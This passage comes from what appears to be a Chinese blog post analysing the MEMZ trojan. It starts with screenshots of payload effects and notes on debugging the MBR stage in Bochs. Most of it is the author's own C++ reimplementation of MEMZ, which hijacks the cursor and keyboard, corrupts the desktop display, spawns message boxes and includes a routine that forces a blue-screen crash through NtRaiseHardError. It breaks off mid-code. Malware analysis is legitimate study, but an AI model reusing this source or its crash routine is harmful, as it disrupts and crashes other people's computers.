src="https://i.loli.net/2021/09/05/wUe8jRp7cKrSgY3.png"></p><p>**func5()**，桌面变色。</p><p><img src="https://i.loli.net/2021/09/05/gd7ZaBrJc8Sp4qu.png"></p><p>**func6()**，随机弹窗</p><p><img src="https://i.loli.net/2021/09/05/48EJuZoDX16cAkx.png"></p><p>**func7()**，图标显示</p><p><img src="https://i.loli.net/2021/09/05/AzxZ1h7ansfiTpY.png"></p><p>**func8()**，不知道效果，迭代子窗口。</p><p><img src="https://i.loli.net/2021/09/05/M2Xbi9Lv3dqDsYo.png"></p><p>**func9()**，桌面窗口复制显现。</p><p><img src="https://i.loli.net/2021/09/05/iL4HsEZF9TSqXem.png"></p><p>**fun10()**，随机复制某块区域。</p><p><img src="https://i.loli.net/2021/09/05/v1Hg9ikVLQrwScC.png"></p><p>一些函数的执行次数数是有限的，一些是随机的，可以看线程函数的代码。</p><h3 id="MBR部分"><a href="#MBR部分" class="headerlink" title="MBR部分"></a>MBR部分</h3><p>这部分也是在以/main为参数的MEMZ.exe实现的。该部分才是真正十分有危害的部分。</p><p>MRB介绍：<a href="http://c.biancheng.net/view/1015.html">http://c.biancheng.net/view/1015.html</a>，可以很形象的从文章最后一张图片看出MRB就是用来启动操作系统的。而MEMZ.exe的MBR部分就是修改了MRB。<br><img src="https://i.loli.net/2021/09/05/J4HX1buFLzeM2Kd.png"></p><p>开始我是直接动调，dump出了这段数据，然后拖到ida去分析，但是根本看不了。后面又看了狗哥的方法，就去试了试，还真可以，下面来写写详细过程。</p><p>环境搭建，首先我们需要在虚拟机里面下载Bochs，然后双击bximage.exe，然后选择1，选择fd，然后选大小，然后写名称。<br><img src="https://i.loli.net/2021/09/05/mJbAshFlgdHx13I.png"></p><p>将得到的img和bochsrc-sample.txt都复制到新建的文件夹里面，路径桌面都行，但不要有中文。</p><p>打开bochsrc-sample.txt的该处修改ata0-master:<br><img src="https://i.loli.net/2021/09/05/ufTywJkNpxWYv2r.png"><br>然后修改.txt为.bxrc，双击，然后选择continue，ok。</p><p><img src="https://i.loli.net/2021/09/05/KovYmITdWLsOtab.png"></p><p>然后将bochsrc-sample..bxrc拖到ida分析，就可以动调了。动调还是一样的，只不过是16位汇编，分析起确实恼火，我也只能通过看反应，和看寄存器来分析个大概。</p><p>动调分析。</p><p>解密第二部分数据<br><img src="https://i.loli.net/2021/09/05/P5kt14RDOXjUpov.png"><br>打印字符串<br><img src="https://i.loli.net/2021/09/05/3FQ9Xotej7CJbKg.png"><br>播放视频<br><img src="https://i.loli.net/2021/09/05/8YwuB3Msdc2QoJC.png"></p><p>到这里该病毒就差不多分析完了。</p><h2 id="部分代码实现"><a href="#部分代码实现" class="headerlink" title="部分代码实现"></a>部分代码实现</h2><p>几乎除了MRB部分都写了，但是防关机功能并未成功，如果知道问题的大佬可以评论一波。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Mmsystem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tchar.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROC_NAME(<span class="meta-string">L&quot;test.exe&quot;</span>)</span></span><br><span class="line"><span class="keyword">int</span> wide;</span><br><span class="line"><span class="keyword">int</span> high;</span><br><span class="line">HCRYPTPROV hProv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> time;</span><br><span class="line"><span class="keyword">int</span> (*func)();</span><br><span class="line">&#125;functable;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">random1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HCRYPTPROV v1;</span><br><span class="line">BYTE pbBuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">v1 = hProv;</span><br><span class="line"><span class="keyword">if</span> (!hProv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!CryptAcquireContextW(&amp;hProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0xF0000040</span>))</span><br><span class="line">ExitProcess(<span class="number">1u</span>);</span><br><span class="line">v1 = hProv;</span><br><span class="line">&#125;</span><br><span class="line">CryptGenRandom(v1, <span class="number">4u</span>, pbBuffer);</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)pbBuffer &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">CBTProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> mid_wide, mid_high;</span><br><span class="line">DWORD* cte;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nCode == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">cte = *(DWORD**)lParam;</span><br><span class="line"><span class="keyword">if</span> ((*(DWORD*)(*(DWORD*)lParam + <span class="number">32</span>) &amp; <span class="number">0x80400000</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">mid_wide = random1() % (wide - cte[<span class="number">5</span>]);</span><br><span class="line">mid_high = random1() % (high - cte[<span class="number">4</span>]);</span><br><span class="line">cte[<span class="number">7</span>] = mid_wide;</span><br><span class="line">cte[<span class="number">6</span>] = mid_high;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">StartAddress</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD ThreadId;</span><br><span class="line">HHOOK hook;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ThreadId = GetCurrentThreadId();</span><br><span class="line">hook = SetWindowsHookExW(<span class="number">5</span>, CBTProc, <span class="number">0</span>, ThreadId);</span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">&quot;hacked by The_Itach1&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, <span class="number">0x1010</span>u);</span><br><span class="line">UnhookWindowsHookEx(hook);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BLUE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//typedef void (* pdef_RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE);</span></span><br><span class="line"><span class="comment">//typedef void (* pdef_NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//HMODULE hMod=NULL;</span></span><br><span class="line"><span class="comment">//FARPROC RtlAdjustPrivilege;</span></span><br><span class="line"><span class="comment">//FARPROC NtRaiseHardError;</span></span><br><span class="line"><span class="comment">//unsigned char ErrKill;</span></span><br><span class="line"><span class="comment">//long unsigned int HDErr;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//hMod = LoadLibraryA(&quot;ntdll&quot;);</span></span><br><span class="line"><span class="comment">//RtlAdjustPrivilege = GetProcAddress(hMod, &quot;RtlAdjustPrivilege&quot;);</span></span><br><span class="line"><span class="comment">//NtRaiseHardError = GetProcAddress(hMod, &quot;NtRaiseHardError&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)RtlAdjustPrivilege;</span></span><br><span class="line"><span class="comment">//pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)NtRaiseHardError;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//if (RtlAdjustPrivilege &amp;&amp; NtRaiseHardError)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//NtCall(19, TRUE, FALSE, &amp;ErrKill);</span></span><br><span class="line"><span class="comment">//NtCall2(0xc0000233, 0, 0, 0, 6, &amp;HDErr);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">FARPROC RtlAdjPriv = GetProcAddress(ntdll, <span class="string">&quot;RtlAdjustPrivilege&quot;</span>);</span><br><span class="line">FARPROC NtRaiseHardErr = GetProcAddress(ntdll, <span class="string">&quot;NtRaiseHardError&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ErrKill;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> HDErr;</span><br><span class="line">((<span class="keyword">void</span>(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(<span class="number">0x13</span>, <span class="literal">true</span>, <span class="literal">false</span>, &amp;ErrKill);</span><br><span class="line">((<span class="keyword">void</span>(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(<span class="number">0xc0000233</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, &amp;HDErr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">wide = GetSystemMetrics(<span class="number">0</span>);</span><br><span class="line">high = GetSystemMetrics(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0x1000</span>u, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">Sleep(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//BLUE();</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">check</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> pro_num = <span class="number">0</span>;</span><br><span class="line">pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">Process32First(hSnapShot, &amp;pe);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(DEF_PROC_NAME, (LPCTSTR)pe.szExeFile))</span><br><span class="line">&#123;</span><br><span class="line">pro_num++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe));</span><br><span class="line"></span><br><span class="line">CloseHandle(hSnapShot);</span><br><span class="line"><span class="keyword">if</span> (pro_num &lt; num)</span><br><span class="line">&#123;</span><br><span class="line">shutdown();</span><br><span class="line">&#125;</span><br><span class="line">num = pro_num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPCSTR website[<span class="number">3</span>] = &#123; <span class="string">&quot;https://www.baidu.com/&quot;</span>, <span class="string">&quot;https://the_itach1.gitee.io/&quot;</span>,<span class="string">&quot;https://cn.bing.com/&quot;</span> &#125;;</span><br><span class="line">ShellExecuteA(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, website[random1() % <span class="number">3</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">POINT Point;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line">GetCursorPos(&amp;Point);</span><br><span class="line">x = random1() % wide;</span><br><span class="line">y = random1() % high;</span><br><span class="line">Point.x = x;</span><br><span class="line">Point.y = y;</span><br><span class="line">SetCursorPos(Point.x, Point.y);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">INPUT input;</span><br><span class="line">input.type = <span class="number">1</span>;</span><br><span class="line">input.ki.wVk = random1() % <span class="number">42</span> + <span class="number">0x30</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, input.ki.wVk);</span><br><span class="line">SendInput(INPUT_KEYBOARD, &amp;input, <span class="number">28</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPCSTR pszSound[<span class="number">3</span>] = &#123; <span class="string">&quot;SystemHand&quot;</span> ,<span class="string">&quot;SystemQuestion&quot;</span> ,<span class="string">&quot;SystemExclamation&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> num = random1();</span><br><span class="line">PlaySoundA(pszSound[num % <span class="number">3</span>], <span class="number">0</span>, <span class="number">1u</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND desktop;</span><br><span class="line">HDC winddc;</span><br><span class="line">RECT rect;</span><br><span class="line"></span><br><span class="line">desktop = GetDesktopWindow();</span><br><span class="line">winddc = GetWindowDC(desktop);</span><br><span class="line">GetWindowRect(desktop, &amp;rect);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, rect.top, rect.bottom, rect.left, rect.right);</span><br><span class="line">BitBlt(winddc, <span class="number">0</span>, <span class="number">0</span>, rect.right - rect.left, rect.bottom - rect.top, winddc, <span class="number">0</span>, <span class="number">0</span>, NOTSRCCOPY);</span><br><span class="line">ReleaseDC(desktop, winddc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">threadptr</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD ThreadId;</span><br><span class="line">HHOOK hook;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ThreadId = GetCurrentThreadId();</span><br><span class="line">hook = SetWindowsHookExW(<span class="number">5</span>, CBTProc, <span class="number">0</span>, ThreadId);</span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Still using this computer?&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, <span class="number">0x1010</span>u);</span><br><span class="line">UnhookWindowsHookEx(hook);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0x1000</span>u, threadptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> icon_w, icon_h;</span><br><span class="line">HWND desktop;</span><br><span class="line">HDC winddc;</span><br><span class="line">POINT Point;</span><br><span class="line">HICON hicon1, hicon2;</span><br><span class="line"></span><br><span class="line">icon_w = GetSystemMetrics(<span class="number">11</span>) / <span class="number">2</span>;</span><br><span class="line">icon_h = GetSystemMetrics(<span class="number">12</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, icon_w, icon_h);</span><br><span class="line">desktop = GetDesktopWindow();</span><br><span class="line">winddc = GetWindowDC(desktop);</span><br><span class="line">GetCursorPos(&amp;Point);</span><br><span class="line">hicon1 = LoadIconW(<span class="number">0</span>, IDI_ERROR);</span><br><span class="line">DrawIcon(winddc, Point.x - icon_w, Point.y - icon_h, hicon1);</span><br><span class="line"></span><br><span class="line">hicon2 = LoadIconW(<span class="number">0</span>, IDI_EXCLAMATION);</span><br><span class="line">DrawIcon(winddc, random1() % wide, random1() % high, hicon2);</span><br><span class="line">ReleaseDC(desktop, winddc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND desktop;</span><br><span class="line">HDC winddc;</span><br><span class="line">RECT Rect;</span><br><span class="line"></span><br><span class="line">desktop = GetDesktopWindow();</span><br><span class="line">winddc = GetWindowDC(desktop);</span><br><span class="line">GetWindowRect(desktop, &amp;Rect);</span><br><span class="line">StretchBlt(winddc, <span class="number">50</span>, <span class="number">50</span>, Rect.right - <span class="number">100</span>, Rect.bottom - <span class="number">100</span>, winddc, <span class="number">0</span>, <span class="number">0</span>, Rect.right, Rect.bottom, SRCCOPY);</span><br><span class="line">ReleaseDC(desktop, winddc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func10</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND desktop;</span><br><span class="line">HDC winddc;</span><br><span class="line">RECT Rect;</span><br><span class="line"><span class="keyword">int</span> x, y, m, n, p, q;</span><br><span class="line"></span><br><span class="line">desktop = GetDesktopWindow();</span><br><span class="line">winddc = GetWindowDC(desktop);</span><br><span class="line">GetWindowRect(desktop, &amp;Rect);</span><br><span class="line"></span><br><span class="line">x = random1() % (Rect.right - <span class="number">100</span>);</span><br><span class="line">y = random1() % (Rect.bottom - <span class="number">100</span>);</span><br><span class="line">m = random1() % <span class="number">600</span>;</span><br><span class="line">n = random1() % <span class="number">600</span>;</span><br><span class="line">p = random1() % (Rect.right - <span class="number">100</span>);</span><br><span class="line">q = random1() % (Rect.bottom - <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">BitBlt(winddc, x, y, m, n, winddc, p, q, SRCCOPY);</span><br><span 